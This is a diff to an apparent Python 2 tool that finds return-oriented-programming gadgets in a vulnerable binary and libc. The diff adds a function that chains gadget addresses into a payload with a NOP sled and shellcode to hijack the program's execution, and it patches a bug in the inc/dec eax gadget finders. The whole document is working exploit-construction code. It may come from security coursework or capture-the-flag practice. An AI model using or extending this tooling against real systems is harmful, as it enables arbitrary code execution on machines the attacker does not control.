@@ -116,10 +116,11 @@ def find_inc_eax(gadgetMap):
     for gadget_addr in gadgetMap:
         instr_list = gadgetMap[gadget_addr]
         mnemonic_list = []
+        op_string = ""
         for instr in instr_list:
             mnemonic_list.append(instr.mnemonic)
-            op_list.append(instr.op_str)
-        if mnemonic_list == ["inc", "ret"] and op_list.count("eax") == 1:
+            op_string += instr.op_str
+        if mnemonic_list == ["inc", "ret"] and op_string.count("eax") == 1:
             return gadget_addr
     return 0
 
@@ -127,10 +128,11 @@ def find_dec_eax(gadgetMap):
     for gadget_addr in gadgetMap:
         instr_list = gadgetMap[gadget_addr]
         mnemonic_list = []
+        op_string = ""
         for instr in instr_list:
             mnemonic_list.append(instr.mnemonic)
-            op_list.append(instr.op_str)
-        if mnemonic_list == ["dec", "ret"] and op_list.count("eax") == 1:
+            op_string += instr.op_str
+        if mnemonic_list == ["dec", "ret"] and op_string.count("eax") == 1:
             return gadget_addr
     return 0
 
@@ -288,6 +290,57 @@ def pack_value(value):
     packed_value = struct.pack("<I", value)
     return packed_value
 
+def build_rop_chain_libc_syscalls(entry):
+
+    rop_payload = ""
+    xor_eax_addr = pack_value(entry[1] + find_xor_eax_eax(entry[0]))
+    ret_addr = xor_eax_addr
+    rop_payload += ret_addr
+
+    dec_eax_addr = pack_value(entry[1] + find_dec_eax(entry[0]))
+    rop_payload += dec_eax_addr
+
+    rop_payload += pack_value(entry[1] + find_and_eax_x1000(entry[0]))
+
+    rop_payload += pack_value(entry[1] + find_mov_ecx_eax(entry[0]))
+    rop_payload += 4 * pack_value(0x11111111)
+
+    rop_payload += xor_eax_addr
+
+    rop_payload += pack_value(entry[1] + find_mov_edx_eax(entry[0]))
+    rop_payload += 3 * pack_value(0x11111111)
+
+    rop_payload += pack_value(entry[1] + find_push_esp_pop_ebx(entry[0]))
+    rop_payload += pack_value(0x11111111)
+
+    xchg_eax_ebx_addr = pack_value(entry[1] + find_xchg_eax_ebx(entry[0]))
+    rop_payload += xchg_eax_ebx_addr
+
+    rop_payload += pack_value(entry[1] + find_and_eax_xfffff000(entry[0]))
+    rop_payload += pack_value(0x11111111)
+
+    rop_payload += xchg_eax_ebx_addr
+
+    rop_payload += xor_eax_addr
+
+    inc_eax_addr = pack_value(entry[1] + find_inc_eax(entry[0]))
+    rop_payload += 7 * inc_eax_addr
+
+    rop_payload += pack_value(entry[1] + find_xchg_eax_edx(entry[0]))
+
+    add_eax_x20_addr = pack_value(entry[1] + find_add_eax_x20(entry[0]))
+    rop_payload += 4 * (add_eax_x20_addr + 2 * pack_value(0x11111111))
+
+    rop_payload += 3 * dec_eax_addr
+
+    nop_len = buf_len + 8 - len(packed_shellcode) - (len(ret_addr) * 10)
+    nop_sled = "\x90" * nop_len
+
+    rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
+
+    print_rop_payload(rop_payload) 
+
+
 def build_rop_chain_libc(lib_list):
     libc_base_address = 0xb7e05000
     f = open("/lib/i386-linux-gnu/libc.so.6", 'rb')
@@ -411,7 +464,7 @@ def get_binary_instr(filename):
             find_gadgets(finiSection, finiStartAddr, gadget_map, unique_gadget_map)
 
         disassembled_map = build_disassembled_gadgets_map(unique_gadget_map)
-        print_gadgets(unique_gadget_map)
+        #print_gadgets(unique_gadget_map)
         print str(len(unique_gadget_map)) + " unique gadgets found." 
         return disassembled_map
     return None 
@@ -448,6 +501,7 @@ if __name__ == '__main__':
         #print 'Optional libraries provided are %s' %(args.lib)
         libraries = args.lib.split(' ')
         for entry in libraries:
+            print entry
             disas_map = get_binary_instr(entry)
             if disas_map == None:
                 print '%s library not present !' %(entry)
@@ -458,11 +512,13 @@ if __name__ == '__main__':
                 print 'Unable to get base address for library %s' %(entry)
                 exit(1)
             lib_list.append((disas_map, base_addr, entry))
-
+    '''
     disas_map = get_binary_instr(args.vuln_bin)
     if disas_map == None:
         print '%s binary not present !' %(args.vuln_bin)
         exit(2)
     lib_list.append((disas_map, 0, args.vuln_bin))
+    '''
 
-    build_rop_chain_libc(lib_list)
+    #build_rop_chain_libc(lib_list)
+    build_rop_chain_libc_syscalls(lib_list[0])
